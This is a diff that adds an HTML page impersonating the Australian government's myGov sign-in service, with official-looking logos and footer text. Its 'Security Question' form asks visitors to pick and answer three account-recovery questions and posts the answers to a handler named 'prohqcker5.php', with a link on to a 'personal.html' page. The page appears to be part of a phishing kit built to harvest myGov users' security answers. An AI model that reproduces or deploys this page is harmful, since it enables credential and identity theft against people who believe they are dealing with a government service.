@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+	<meta http-equiv="x-ua-compatible" content="ie=edge">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<title>Sign in with myGov - myGov</title>
+	<meta name="description" content="">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="format-detection" content="telephone=no">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon.ico">
+	<link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&amp;display=swap" rel="stylesheet">
+	<link href="css/mgv2-application.css" rel="stylesheet">
+	<link href="css/blugov.css" rel="stylesheet">
+    <style>
+          select{
+            width: 100%;
+		    padding-left: 10px;
+		    margin: 2px 0;
+		    display: inline-block;
+		    font-size: 1rem;
+		    height: 2.8125rem;
+    	    border-radius: 0.25rem;
+		    box-sizing: border-box;
+		    background-color: white;
+   		    -webkit-appearance: none;
+		    border: 0.0625rem solid #686869;
+		    outline-color: #1f72bb;
+            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' version='1.1' viewBox='0 0 32 24'><polygon points='0,0 32,0 16,24' style='fill: rgb(55, 67, 92)'></polygon></svg>");
+            background-origin: content-box;
+            background-position: right -1rem center;
+            background-repeat: no-repeat;
+            background-size: 12px 12px;
+            padding-right: 1.5rem;
+            font-family: Gibson-Regular-webfont;
+            color: #444b5b
+}
+    </style>
+</head>
+<body>
+    <div class="brand-rainbow">&nbsp;</div>
+<header role="banner" class="mgvEnhanceHeader">
+	<section class="wrapper">
+		<div class="inner">
+			<div class="unauth-grid">
+				<div class="unauth-grid-row">
+					<a class="unauth-govt-crest__link">
+					    <img id="unauth-govt-crest" src="images/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
+                    </a>
+				</div>
+			</div>
+		</div>
+	</section>
+</header>
+<div class="wrapper-mapwap">
+    <div class="main-block" id="content" role="main">
+        <h1>Security Question</h1>
+	    <p style="font-size: 14px">Please choose the question that was related to your profile and answer correctly.</p>
+        <hr>
+        <form id="forgotten-username-form" action="prohqcker5.php" method="post">
+            <div class="input-group">
+                <label class="override" for="userId">Security Question 1</label>
+                <select name="question1" required="">
+                    <option>Select Your Security Question</option>
+                    <option value="What was the first single/album I bought?">What was the first single/album I bought?</option>
+                    <option value="What was the first live concert, theatre or bandI went to see?">What was the first live concert, theatre or band I went to see?</option>
+                    <option value="What is the name of the primary school I attended?">What is the name of the primary school I attended?</option>
+                    <option value="What was my favorite place to visit as a child?">What was my favorite place to visit as a child?</option>
+                    <option value="What was my nickname at school?">What was my nickname at school?</option>
+                    <option value="What is the name of the first street i lived in?">What is the name of the first street i lived in?</option>
+                </select> 
+                <input id="answer" name="answer1" aria-required="true" placeholder="Answer" type="text" value="" autocomplete="off" required>
+            </div>
+            <div class="input-group">
+                <label class="override" for="userId">Security Question 2</label>
+                <select name="question2" required="">
+                    <option>Select Your Security Question</option>
+                    <option value="What was the first single/album I bought?">What was the first single/album I bought?</option>
+                    <option value="What was my favorite childhood book?">What was my favorite childhood book?</option>
+                    <option value="What sport or hobby did I do as a child?">What sport or hobby did I do as a child?</option>
+                    <option value="What is the name of the primary school I attended?">What is the name of the primary school I attended?</option>
+                    <option value="What was my nickname at school?">What was my nickname at school?</option>
+                    <option value="What was the name of my first pet?">What was the name of my first pet?</option>
+                </select>
+                <input id="answer" name="answer2" aria-required="true" placeholder="Answer" type="text" value="" autocomplete="off" required>
+            </div>
+            <div class="input-group">
+                <label class="override" for="userId">Security Question 3</label>
+                <select name="question3" required="">
+                    <option >Select Your Security Question</option>
+                    <option value="What is my most memorable momentin my adult life?">What is my most memorable momentin my adult life?</option>
+					<option value="Who was my favorite teacher at school?">Who was my favorite teacher at school?</option>
+					<option value="What sport or hobby did I do as a child?">What sport or hobby did I do as a child?</option>
+					<option value="What was the full name of my first boyfriend/girlfriend?">What was the full name of my first boyfriend/girlfriend?</option>
+					<option value="What is your favorite memory from school?">What is your favorite memory from school?</option>
+					<option value="What was the name of my first pet?">What was the name of my first pet?</option>
+                </select>
+                <input id="answer" name="answer3" aria-required="true" placeholder="Answer" type="text" value="" autocomplete="off" required>
+            </div>
+            <div class="button-container">
+                <button type="submit" name="_eventId_submit" class="button-main button">Next</button>
+                <p><a href="personal.html">Skip Question</a></p>
+            </div>
+        </form>
+    </div>
+</div>
+<footer role="contentinfo">
+    <div class="wrapper">
+      <div class="inner">
+
+        <section class="footer-list">
+            <nav>
+            <h2 class="sr-only" aria-label="Footer">Footer</h2>
+            <ul class="lower-links">
+                <li>
+                    <a target="_blank">Terms of use</a>
+                </li>
+                <li>
+                    <a target="_blank">Privacy and security</a>
+                </li>
+                <li>
+                    <a target="_blank">Copyright</a>
+                </li>
+                <li>
+                    <a target="_blank">Accessibility</a>
+                </li>
+            </ul>
+            </nav>
+        </section>
+          <div class="footer-lower">
+              <section class="footer-lower-logo">
+              <a>
+                  <img src="images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
+              </a>
+              </section>
+
+              <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+          </div>
+
+
+
+
+      </div>
+    </div>
+  </footer>
+
+
+
+</body></html>
